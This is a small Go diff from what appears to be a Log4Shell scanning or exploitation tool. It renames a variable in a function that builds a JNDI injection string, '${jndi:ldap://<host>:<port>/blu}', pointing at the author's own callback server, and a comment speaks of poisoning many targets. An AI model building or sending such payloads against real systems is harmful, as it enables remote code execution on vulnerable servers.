@@ -66,7 +66,7 @@ func request(destCIDR string, destPort string, sourceIp string, sourcePort strin
 		}
 		var lh string = "${jndi:ldap:"
 		// I changed the following to my static public IP on my EC2 instance
-		var publicSourceIP string = sourceIp
+		var publicSourceIp string = sourceIp
 		var rh string = "blu}"
 		var payload string = fmt.Sprintf("%v//%v:%v/%v", lh, publicSourceIp, sourcePort, rh)
 		// Poison a whole bunch
